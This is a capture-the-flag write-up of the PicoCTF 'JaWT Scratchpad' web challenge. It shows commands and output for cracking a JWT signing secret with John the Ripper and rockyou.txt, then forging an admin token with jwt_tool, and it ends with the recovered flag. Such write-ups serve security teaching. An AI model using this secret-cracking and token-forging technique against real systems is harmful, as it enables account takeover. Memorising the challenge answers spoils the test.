---
title: "JaWT Scratchpad"
description: "Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/58210/ or http://jupiter.challenges.picoctf.org:58210\n\nHint: What is that cookie?\nHint: Have you heard of JWT?"
pubDate: 2025-03-13
category: "web"
author: "sealldev"
section: "PicoCTF"
tags: ["medium"]
image: "./images/picoctf/jawtscratchpad/home.png"
---

We are given a webapp with a home page, specifying we can use any username *except* admin:
![home.png](images/picoctf/jawtscratchpad/home.png)

We can input the username 'sealldev' and we are given our scratchpad:
![myscratchpad.png](images/picoctf/jawtscratchpad/myscratchpad.png)

When we are logged in, I use EditThisCookie2 to look at and modify my cookies:
![cookie.png](images/picoctf/jawtscratchpad/cookie.png)

That is a JWT token! Let's use jwt.io to analyse it.
![jwtdecode.png](images/picoctf/jawtscratchpad/jwtdecode.png)

It has a `user` with the username we inputted, we don't know the secret so we can't modify the `user` to `admin`.

The webapp page has a hint:
> You can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like **John**!

**John** has a hyperlink attached to JohnTheRipper, a hash cracking software!

So, can we crack the hash for the JWT? The answer is yes! I download SecLists to get rockyou.txt.
```bash
$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2VhbGxkZXYifQ.JBWK-4qJOo1qQDT1JixKFdEzKc2fM2oR4fxTJ62m6wI" > jwt
$ john --wordlist=/.../SecLists/Passwords/Leaked-Databases/rockyou.txt jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 ASIMD 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:02 DONE (2025-03-13 23:38) 0.3355g/s 2481Kp/s 2481Kc/s 2481KC/s ilovepie77..ilovepets!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password is `ilovepico`!

We can now use jwt_tool to forge a new JWT token.

```bash
$ python3 jwt_tool.py -p ilovepico -T -S hs256 "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic2VhbGxkZXYifQ.JBWK-4qJOo1qQDT1JixKFdEzKc2fM2oR4fxTJ62m6wI"                                                     1 ↵

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] typ = "JWT"
[2] alg = "HS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] user = "sealldev"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of user is: sealldev
Please enter new value and hit ENTER
> admin
[1] user = "admin"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_bbe5a5f4d2742010313ecfcfe3a15d73 - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```

To explain the options we used in the command:
- `-p ilovepico` specifies the password for the signature
- `-S hs256` specifies with what algorithm to sign the new signature
- `-T` enables tampering which has the dialogue to change the 

I then change the payload to set the `user` to `admin`.

It then returns the tampered token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s`.

We can then change the `jwt` cookie to have that as the value (I use EditThisCookie2 to update it).

I then reload the page and get the flag!
![flag.png](images/picoctf/jawtscratchpad/flag.png)

Flag: `picoCTF{jawt_was_just_what_you_thought_44c752f5}`